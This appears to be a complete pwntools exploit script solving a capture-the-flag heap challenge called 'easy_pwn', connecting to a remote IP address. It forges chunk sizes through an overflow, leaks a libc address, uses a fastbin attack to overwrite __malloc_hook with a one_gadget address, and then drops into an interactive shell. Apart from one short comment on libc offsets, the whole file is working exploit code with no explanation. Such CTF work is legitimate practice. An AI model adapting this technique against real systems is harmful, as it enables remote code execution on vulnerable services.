#coding:utf-8
from pwn import *

context.log_level='debug'


#p=process("./easy_pwn")
p=remote('39.97.182.233',38892)


def gettickets(size):
    p.sendlineafter(": ",'1')
    p.sendlineafter("size: ",str(size))

def playgame(idx,content,length):
    p.sendlineafter(": ",'2')
    p.sendlineafter("index: ",str(idx))
    p.sendlineafter("size: ",str(length))
    p.sendlineafter("content: ",content)

def gameover(idx):
    p.sendlineafter(": ",'3')
    p.sendlineafter("index: ",str(idx))

def lookticket(idx):
    p.sendlineafter(": ",'4')
    p.sendlineafter("index: ",str(idx))
    p.recvuntil('content: ' )
    s = p.recvuntil("Note system",drop=True)
    return s


gettickets(0x58) #0
gettickets(0x40) #1
payload=p64(0)*11+p8(0x71)
length=len(payload)+9
playgame(0,payload,length)

gettickets(0x80) #2
payload1=p64(0)*3+p64(0x71)
length=len(payload1)
playgame(2,payload1,length)
gameover(1)

gettickets(0x60) #1
payload2=p64(0)*9+p8(0x91)
length=len(payload2)
playgame(1,payload2,length)
gettickets(0x50) #3
gameover(2)

leak=u64(lookticket(1)[-8:-1].strip().ljust(8,'\x00'))
#print "malloc hook addr = "+ hex(leak)
#确定libc为2.23，libc基址与main_arena起始地址偏移为0x3c4b20
libc_base=leak-0x3c4b78
#print hex(libc_base)

gettickets(0x60)#2
gameover(2)

payload=p64(libc_base+0x3c4aed)
playgame(1,"a"*0x48+p64(0x71)+payload,0x58)
gettickets(0x60)#4
gettickets(0x60)#5
one = [0x4526a,0x45216,0xf02a4,0xf1147]
payload = "\x00"*0xb  #p8(f)*3
payload += p64(libc_base + one[3]) #
payload += p64(libc_base + 0x846c0+0x4)
playgame(4,payload+"\x00"*0x10,len(payload)+0x10)
gettickets(0x10)
p.interactive()
